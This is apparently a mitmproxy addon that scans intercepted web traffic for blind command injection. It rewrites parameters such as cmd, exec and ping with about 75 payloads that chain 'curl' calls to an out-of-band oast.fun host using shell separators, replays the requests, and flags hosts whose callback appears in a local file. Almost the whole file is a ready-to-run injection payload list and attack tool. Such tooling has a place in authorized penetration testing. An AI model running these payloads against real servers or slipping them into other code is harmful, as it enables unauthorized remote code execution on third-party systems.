from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import random

class RCE2:
    def __init__(self):
        self.flow_dir = "RCE_flows"
        os.makedirs(self.flow_dir, exist_ok=True)
        self.random_number = None

        self.payload_template = [
    "curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ",curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ";curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ";curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    "'curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun'",
    "\"curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun\"",
    "''curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "''curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun''",
    "''curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun''&",
    "*curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "*curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun*",
    "**curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun**",
    "(curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun)",
    "`curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    "`curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`&",
    "`curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun` &",
    ";curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun|",
    ";|curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun|",
    "|curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "|curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun|",
    "||curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "||curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun|",
    "||curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    "|curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    "&curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "&curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun&",
    "&&curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "&&curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun&&",
    "^curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "<curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "\\curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ");curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "<curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    ");curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    ");curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun|",
    ")|curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ")|curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    "\\curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    "\\curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun|",
    "\\curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun\\",
    "(curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ")curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "/curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "-curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ":curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ".curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "\" curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "' curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "| curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "& curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    ", curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "; curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "& curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun &",
    "&& curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "|| curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "' `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    "\" `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    ", `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    "| `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    "& `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    "; `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun`",
    "' `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun` #",
    "\" `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun` #",
    ", `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun` #",
    "| `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun` #",
    "; `curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun` #",
    ";curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun/n",
    "<curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun\n",
    "\ncurl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "\ncurl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun\n",
    "a;curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "a);curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun",
    "a;curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun;",
    "a);curl {host}.{random_number}.cmda6gq9c64ciloq4n90ijy1k7xgedk8h.oast.fun"
]

        self.altered_header = "x-altered"
        self.host_found = None
        self.watched_parameters = ["pwd","daemon", "upload", "dir", "download", "log", "ip", "cli", "cmd", "exec", "command", "execute", "ping", "query", "jump", "code", "reg", "do", "func", "arg", "option", "load", "process", "step", "read", "function", "req", "feature", "exe", "module", "payload", "run", "print"]
        
        

    def response(self, flow: http.HTTPFlow) -> None:
        self.host_found = False
        
        if self.altered_header in flow.request.headers:
            self.check_vulnerability(flow)
            return

        if self.host_found:
                    return

        if flow.request.method in ["GET", "POST"]:
            self.process_parameters(flow)

    def process_parameters(self, flow):
        params = {}
        if flow.request.method == "GET":
            params = flow.request.query
        elif flow.request.method == "POST":
            content_type = flow.request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(flow.request.get_text())
            elif "application/json" in content_type:
                try:
                    params = json.loads(flow.request.get_text())
                    if not isinstance(params, dict):
                        params = {}
                except json.JSONDecodeError:
                    ctx.log.info("JSON decode error")
                    params = {}

        for watched_param in self.watched_parameters:
            if watched_param in params:
                value = params[watched_param][0] if isinstance(params[watched_param], list) else params[watched_param]
                self.test_payloads(flow, watched_param, value)

    def test_payloads(self, original_flow, param, original_value):
        self.random_number = str(random.randint(1000, 9999))
        for template in self.payload_template:
            if self.host_found:
                break  # Stop if a vulnerability has already been found

            altered_value = template.format(host=original_flow.request.host, random_number=self.random_number)
            altered_flow = self.alter_request(original_flow, param, altered_value)

            if altered_flow:
                if self.host_found:
                    return
                 
                ctx.master.commands.call("replay.client", [altered_flow])
                # The response handling is now managed by the check_vulnerability method

    def alter_request(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if param in body and isinstance(body[param], str):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header] = "true"

        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_vulnerability(self, flow):

        host_with_random = f"{flow.request.host}.{self.random_number}"
        

        # Checking external file
        try:
            with open('file.txt', 'r') as file:
                file_content = file.read()

            if host_with_random in file_content and not self.host_found:
                self.host_found = True
                self.save_flow(flow)
                ctx.log.info(f"External resource indicates potential RCE for host: {flow.request.host}")
        except IOError as e:
            ctx.log.error(f"Error reading file: {e}")

    def save_flow(self, flow):
        identifier = f"{flow.request.method}_{flow.request.host}_{flow.request.path}".replace("/", "_")
        filename = os.path.join(self.flow_dir, f"{identifier}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"RCE detected and saved in {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [RCE2()]
